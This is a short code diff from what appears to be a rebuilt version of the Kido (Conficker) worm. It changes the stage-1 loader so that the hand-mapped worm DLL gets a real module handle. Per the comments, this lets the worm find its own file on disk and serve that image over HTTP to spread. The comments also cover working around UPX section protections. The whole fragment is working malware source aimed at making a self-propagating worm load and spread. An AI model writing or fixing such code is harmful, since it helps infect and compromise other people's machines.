@@ -231,7 +231,14 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
             }
             typedef BOOL (WINAPI* DllMainFn)(HINSTANCE, DWORD, LPVOID);
             DllMainFn fn = (DllMainFn)((LPBYTE)mod + eprva);
-            if (fn) fn((HINSTANCE)mod, DLL_PROCESS_ATTACH, reserved);
+            /* Forward stage-1's OWN real module handle (hinst) as the reserved
+               argument, not the hand-mapped base. The worm resolves its on-disk
+               path via GetModuleFileNameA(reserved ? reserved : hinst); a base
+               that isn't PEB-registered (our hand-mapped mod) yields no path,
+               so the worm can't read its own image to serve over HTTP. In the
+               original, stage-1 likewise hands the wrapper's real handle down so
+               the worm's g_path is the wrapper file on disk. */
+            if (fn) fn(hinst, DLL_PROCESS_ATTACH, hinst);
             /* kido_apply_prot() is intentionally NOT called here: the UPX stub has
                already applied the correct per-section protections at run time, and
                the worm's main thread is now executing. Forcing PAGE_* on UPX0 after
